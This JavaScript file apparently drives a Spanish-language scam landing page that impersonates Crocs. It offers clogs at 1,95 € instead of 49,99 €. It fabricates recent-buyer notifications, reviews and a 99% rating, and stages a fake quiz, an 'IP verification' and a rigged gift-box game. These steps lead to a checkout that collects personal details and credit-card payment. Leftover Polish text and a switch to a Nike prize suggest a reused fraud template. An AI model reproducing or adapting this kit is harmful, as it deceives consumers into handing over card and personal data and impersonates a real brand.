const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "es";
  const lang = "es-ES";
  const locale = lang;

  const sizes = {
    enabled: true,
    selectText: "TALLA: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menu",
    account: "Iniciar sesión",
    heart: "Lista de deseos",
    bag: "Carrito",
    find: "Buscar"
  };

  const mainProduct = {
    header: "Oferta limitowana",
    name: "Zuecos unisex Classic U",
    oldPrice: "49,99 €",
    newPrice: "1,95 €",
    selectText: "COLOR: ",
    text: `Disfruta de un ajuste a tu medida, resistente al agua y con ventilación para mayor transpirabilidad. Crocs
          Classic es el zapato perfecto para cualquier ocasión. Completamente moldeado con material Croslite™.
<br></br>
          Increíblemente ligeras y súper divertidas en los pies.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Barcelona, España",
      action: "¡Acabo de recibir la Zuecos por 1,95 euros!",
      timeago: "hace 15 segundos",
    },
    {
      user: "Carlos B******",
      location: "Madrid, España",
      action: "¡Acabo de recibir la Zuecos por 1,95 euros!",
      timeago: "hace 25 segundos",
    },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Hace un día",
      header: "¡Es increíble!",
      product: "26468781",
      review: "“¡Me encanta mi zueco clásico Crocs! Son increíblemente cómodos e ideales para caminar y hacer jardinería. Ligero y fácil de limpiar 😊",
      image: "./index_files/review1.jpg",
    },
    {
      name: "Lucas",
      time: "Hace dos días",
      header: "¡Genial! No tengo palabras.",
      product: "26468783",
      review: "Compré Crocs para la playa, pero ahora los uso todos los días. Cómodos, no irritan y tus pies no sudan con ellos. Gran elección",
      image: "./index_files/review2.jpg",
    },
    {
      name: "Valentina",
      time: "Hace dos días",
      header: "Simplemente genial.",
      product: "26468782",
      review: "A mi hija le encantan los Crocs con los coloridos Jibbitz. No sólo son bonitos, sino también cómodos. Adecuado tanto para la escuela como para excursiones.",
      image: "./index_files/review3.jpg",
    },
    {
      name: "Santiago",
      time: "Hace cuatro días",
      header: "Me gusta",
      product: "26468782",
      review: "Al principio era escéptico, pero después del primer uso entendí por qué todo el mundo los ama tanto. Increíblemente cómodo y ligero. Excelente compra!",
      image: "./index_files/review4.jpg",
    },
    {
      name: "Martina",
      time: "Hace siete días",
      header: "¡Guau, me encanta este producto!",
      product: "26468783",
      review: "¡Me encantan los Crocs! Son tan suaves y cómodos que puedo usarlos todo el día sin cansarme. Ideal para viajes y largas caminatas. ¡Se lo recomiendo a todos!",
      image: "./index_files/review5.jpg",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "OPINIONES Y RESEÑAS",
    percent: "99%",
    rec: "Comentarios sobre esta promoción",
  };

  const questions = {
    _of: "Pregunta {1} de {2}: ",
    arr: [
      {
        q: "¿Has utilizado nuestros productos?",
        a: [
          "Sí, compro a menudo",
          "Sí, compro raramente",
          "Nunca he comprado",
        ],
      },
      {
        q: "¿Nos recomendarías a tus amigos?",
        a: ["¡Sí, por supuesto!", "Sí, pero cambia el diseño de los crocs.", "No"],
      },
      {
        q: "¿Qué color de Crocs es el más popular este año?",
        a: ["Negro", "Verde", "Blanco", "Rojo"],
      },
    ],
  };

  const check = {
    title: "Tu respuesta será verificada...",
    arr: [
      "Has respondido a la pregunta 3/3.",
      "Tu dirección IP no permite sacar conclusiones sobre solicitudes anteriores.",
      "Tu respuesta ha sido verificada.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Felicidades, has confirmado que eres una persona real",
        button: "OK",
        text: `
        <center>
       Hoy, {date}, tienes la oportunidad de comprar un par de zapatos Nike Air Force 1'07 a un precio especial
          <br><br>
         Todo lo que necesitas hacer es elegir la caja de regalo correcta.
          <br><br>
      Tienes 3 intentos, ¡buena suerte!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
        <center>
    Lamentablemente, este regalo está vacío! Aún tienes 2 intentos - ¡buena suerte!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "¡Felicidades! ¡Has ganado!",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
       Has ganado un par de zapatillas "Nike Air Force 1'07"
          </p>
          <br>
            1) Haz clic en "OK" para ir a la página de entrega.
            <br><br>
            2) Completa el formulario y paga el pedido aprovechando tu descuento personal.
            <br><br>
            3) El paquete será entregado en 2-3 días.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Información personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de teléfono",
        },
        email: {
          enabled: true,
          field: "Correo electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de entrega",
        },
        zip: {
          enabled: true,
          field: "Código postal",
        },
      },
    },
    payment: {
      title: "Métodos de pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detalles del pedido",
      oldPrice: "49,99 €",
      newPrice: "1,95 €",
      size: "Talla",
      subTotal: {
        title: "Subtotal",
        amount: "1,95 €",
      },
      delivery: {
        title: "Entrega",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Paga tu pedido",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "Black",
      miniImg: "./index_files/img/item1/item1.jpg",
      images: [
        "./index_files/img/item1/item1.jpg",
        "./index_files/img/item1/item2.jpg",
        "./index_files/img/item1/item3.jpg",
        "./index_files/img/item1/item4.jpg",
        "./index_files/img/item1/item5.jpg",
        "./index_files/img/item1/item6.jpg",
      ],
    },
    {
      id: "26468782",
      name: "Juice",
      miniImg: "./index_files/img/item2/item1.jpg",
      images: [
        "./index_files/img/item2/item1.jpg",
        "./index_files/img/item2/item2.jpg",
        "./index_files/img/item2/item3.jpg",
      ],
    },
    {
      id: "26468783",
      name: "White",
      miniImg: "./index_files/img/item3/item1.jpg",
      images: [
        "./index_files/img/item3/item1.jpg",
        "./index_files/img/item3/item2.jpg",
        "./index_files/img/item3/item3.jpg",
        "./index_files/img/item3/item4.jpg",
        "./index_files/img/item3/item5.jpg",
        "./index_files/img/item3/item6.jpg",
      ],
    },
    {
      id: "26468784",
      name: "Aciditys",
      miniImg: "./index_files/img/item4/item1.jpg",
      images: [
        "./index_files/img/item4/item1.jpg",
        "./index_files/img/item4/item2.jpg",
        "./index_files/img/item4/item3.jpg",
        "./index_files/img/item4/item4.jpg",
        "./index_files/img/item4/item5.jpg",
        "./index_files/img/item4/item6.jpg",
      ],
    },
    {
      id: "26468785",
      name: "Lavender",
      miniImg: "./index_files/img/item5/item1.jpg",
      images: [
        "./index_files/img/item5/item1.jpg",
        "./index_files/img/item5/item2.jpg",
        "./index_files/img/item5/item3.jpg",
        "./index_files/img/item5/item4.jpg",
        "./index_files/img/item5/item5.jpg",
        "./index_files/img/item5/item6.jpg",
      ],
    },
    {
      id: "26468786",
      name: "Green Ivy",
      miniImg: "./index_files/img/item6/item1.jpg",
      images: [
        "./index_files/img/item6/item1.jpg",
        "./index_files/img/item6/item2.jpg",
        "./index_files/img/item6/item3.jpg",
        "./index_files/img/item6/item4.jpg",
        "./index_files/img/item6/item5.jpg",
        "./index_files/img/item6/item6.jpg",
      ],
    },
    {
      id: "26468787",
      name: "Bone",
      miniImg: "./index_files/img/item7/item1.jpg",
      images: [
        "./index_files/img/item7/item1.jpg",
        "./index_files/img/item7/item2.jpg",
        "./index_files/img/item7/item3.jpg",
        "./index_files/img/item7/item4.jpg",
      ],
    },
    {
      id: "26468788",
      name: "Arctic",
      miniImg: "./index_files/img/item8/item1.jpg",
      images: [
        "./index_files/img/item8/item1.jpg",
        "./index_files/img/item8/item2.jpg",
        "./index_files/img/item8/item3.jpg",
        "./index_files/img/item8/item4.jpg",
        "./index_files/img/item8/item5.jpg",
        "./index_files/img/item8/item6.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© Crocs™ | Copyright 2024 | Todos los derechos reservados",
  };

  const pathImgBox = {
    lid: "./index_files/box-lid.png",
    lidIOs: "./index_files/box-lid-ios.png",
    inner: "./index_files/box-inner.png",
    innerGift: "./index_files/box-inner-gift.png",
    box: "./index_files/box.png",
    boxModal: "./index_files/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
